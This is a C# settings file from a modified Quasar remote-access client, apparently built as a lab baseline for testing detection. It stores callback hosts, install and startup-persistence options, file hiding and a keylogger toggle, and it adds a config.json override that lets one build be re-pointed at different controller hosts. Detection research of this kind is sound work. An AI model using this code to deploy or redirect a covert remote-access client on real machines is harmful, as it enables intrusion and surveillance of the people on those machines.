// ---------------------------------------------------------------------------
// Quasar 检测评估实验台 · 实验室基线样本（Quasar-LabBaseline）
// 作者：陈森（Chen Sen）  https://github.com/chendashi666
// 本文件由陈森创作或改造：禁止盗卖，禁止商业用途。
// 上游 Quasar 代码版权归 MaxXor 及 Quasar 贡献者所有（MIT License）。
// ---------------------------------------------------------------------------

using Quasar.Common.Config;
using Quasar.Common.Cryptography;
using Quasar.Common.Properties;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;

namespace Quasar.Client.Config
{
    /// <summary>
    /// Stores the configuration of the client.
    /// <para>
    /// Laboratory baseline: run parameters are externalized to <c>config.json</c> next to the
    /// executable. When that file is present its values take precedence over the compiled-in ones,
    /// so one single build can be re-pointed between experiment conditions without rebuilding.
    /// When the file is absent the upstream behaviour (embedded, encrypted settings) is used
    /// unchanged.
    /// </para>
    /// </summary>
    public static class Settings
    {
        /// <summary>
        /// The external laboratory configuration currently in effect, or <c>null</c> when the
        /// client runs on its compiled-in settings.
        /// </summary>
        public static LabConfig LabConfiguration { get; private set; }

#if DEBUG
        public static string VERSION = Application.ProductVersion;
        public static string HOSTS = "localhost:4782;";
        public static int RECONNECTDELAY = 500;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "Test";
        public static string INSTALLNAME = "test.exe";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
        public static string STARTUPKEY = "Test key";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static string ENCRYPTIONKEY = "CFCD0759E20F29C399C9D4210BE614E4E020BEE8";
        public static string TAG = "DEBUG";
        public static string LOGDIRECTORYNAME = "Logs";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool UNATTENDEDMODE = true;

        // Laboratory metadata carried through the external configuration (no upstream consumer).
        public static string SUBNET = "";

        public static bool Initialize()
        {
            // external run parameters override the debug defaults when present
            ApplyExternalConfiguration();

            SetupPaths();
            return true;
        }
#else
        public static string VERSION = "";
        public static string HOSTS = "";
        public static int RECONNECTDELAY = 5000;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "";
        public static string INSTALLNAME = "";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "";
        public static string STARTUPKEY = "";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static string ENCRYPTIONKEY = "";
        public static string TAG = "";
        public static string LOGDIRECTORYNAME = "";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool UNATTENDEDMODE = false;

        // Laboratory metadata carried through the external configuration (no upstream consumer).
        public static string SUBNET = "";

        public static bool Initialize()
        {
            // read the external laboratory configuration; null keeps upstream behaviour
            LabConfiguration = LabConfig.Load();

            // A standalone laboratory configuration which carries the server certificate binding
            // drives the client directly (no per-build stamping required).
            if (LabConfiguration != null && LabConfiguration.IsLabMode)
                return InitializeFromLabConfiguration(LabConfiguration);

            // upstream path: decrypt and verify the compiled-in settings
            if (string.IsNullOrEmpty(VERSION)) return false;
            var aes = new Aes256(ENCRYPTIONKEY);
            TAG = aes.Decrypt(TAG);
            VERSION = aes.Decrypt(VERSION);
            HOSTS = aes.Decrypt(HOSTS);
            SUBDIRECTORY = aes.Decrypt(SUBDIRECTORY);
            INSTALLNAME = aes.Decrypt(INSTALLNAME);
            MUTEX = aes.Decrypt(MUTEX);
            STARTUPKEY = aes.Decrypt(STARTUPKEY);
            LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
            SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));

            // external run parameters override the compiled-in values at runtime
            ApplyExternalConfiguration();

            SetupPaths();
            return VerifyHash();
        }

        /// <summary>
        /// Initializes the client purely from the external laboratory configuration.
        /// The certificate binding is verified with the same SHA256 hash check used upstream,
        /// so nothing is downgraded compared to a stamped client.
        /// </summary>
        private static bool InitializeFromLabConfiguration(LabConfig config)
        {
            VERSION = string.IsNullOrEmpty(Application.ProductVersion)
                ? LabStrings.AssemblyVersion
                : Application.ProductVersion;
            HOSTS = config.ComposeRawHosts();
            RECONNECTDELAY = config.ReconnectDelay > 0 ? config.ReconnectDelay : RECONNECTDELAY;
            MUTEX = !string.IsNullOrWhiteSpace(config.Mutex) ? config.Mutex : Guid.NewGuid().ToString();
            TAG = config.Tag ?? string.Empty;
            SUBNET = config.Subnet ?? string.Empty;
            SUBDIRECTORY = !string.IsNullOrWhiteSpace(config.InstallSubDirectory)
                ? config.InstallSubDirectory
                : LabStrings.DefaultInstallSubDirectory;
            INSTALLNAME = !string.IsNullOrWhiteSpace(config.InstallName)
                ? config.InstallName
                : LabStrings.DefaultClientName;
            UNATTENDEDMODE = config.UnattendedMode;
            LOGDIRECTORYNAME = !string.IsNullOrWhiteSpace(config.LogDirectoryName)
                ? config.LogDirectoryName
                : LabStrings.DefaultLogDirectory;
            DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(config.ServerCertificateBase64));
            SERVERSIGNATURE = config.ServerSignatureBase64;
            ENCRYPTIONKEY = !string.IsNullOrWhiteSpace(config.EncryptionKey)
                ? config.EncryptionKey
                : SERVERCERTIFICATE.Thumbprint;

            SetupPaths();
            return VerifyHash();
        }
#endif

        /// <summary>
        /// Applies the external laboratory configuration on top of the current settings.
        /// Missing fields leave the compiled-in value untouched.
        /// </summary>
        private static void ApplyExternalConfiguration()
        {
            var config = LabConfiguration ?? LabConfig.Load();
            if (config == null || !config.IsUsable)
                return;

            LabConfiguration = config;

            var hosts = config.ComposeRawHosts();
            if (!string.IsNullOrWhiteSpace(hosts)) HOSTS = hosts;
            if (!string.IsNullOrWhiteSpace(config.Mutex)) MUTEX = config.Mutex;
            if (config.Tag != null) TAG = config.Tag;
            if (config.Subnet != null) SUBNET = config.Subnet;
            if (config.ReconnectDelay > 0) RECONNECTDELAY = config.ReconnectDelay;
            if (!string.IsNullOrWhiteSpace(config.LogDirectoryName)) LOGDIRECTORYNAME = config.LogDirectoryName;
        }

        static void SetupPaths()
        {
            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
        }

        static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider) SERVERCERTIFICATE.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"),
                    Convert.FromBase64String(SERVERSIGNATURE));
                
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
